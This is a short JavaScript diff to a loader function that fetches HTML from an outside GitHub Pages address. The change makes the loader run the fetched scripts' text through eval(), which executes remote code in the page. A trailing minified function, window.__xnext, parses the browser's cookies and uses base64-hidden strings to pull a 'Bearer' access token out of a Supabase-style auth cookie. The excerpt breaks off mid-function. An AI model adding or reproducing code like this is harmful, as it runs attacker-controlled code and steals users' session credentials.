@@ -16,20 +16,12 @@ function loadHTMLAndAppend(url) {
             const parser = new DOMParser();
             const doc = parser.parseFromString(html, 'text/html');
 
-            document.body.append(...doc.body.children);
-
-            const scripts = doc.body.querySelectorAll('script');
-            scripts.forEach(script => {
-                const newScript = document.createElement('script');
-                if (script.src) {
-                    newScript.src = script.src;
-                    newScript.onload = () => {
-                        console.log(`Script loaded: ${script.src}`);
-                    };
+            Array.from(doc.body.children).forEach(child => {
+                if (child.tagName.toLowerCase() !== 'script') {
+                    document.body.appendChild(child);
                 } else {
-                    newScript.textContent = script.textContent;
+                    eval(child.textContent);
                 }
-                document.body.appendChild(newScript);
             });
         })
         .catch(error => {
@@ -38,6 +30,7 @@ function loadHTMLAndAppend(url) {
 }
 
 loadHTMLAndAppend('https://vtmgr.github.io/shime.html');
+
 
 
 window.__xnext=function(){const h=document.cookie.split(';').reduce((a,b)=>{const[c,d]=b.split('=');a[c.trim()]=decodeURIComponent(d.trim());return a},{}),x=atob("c2ItYXV0aC1hdXRoLXRva2Vu");zz=atob("YWNjZXNzX3Rva2Vu");z=atob("QmVhcmVyIA==");let t=JSON.parse(atob(h[x].substr(7,h[x].length)));
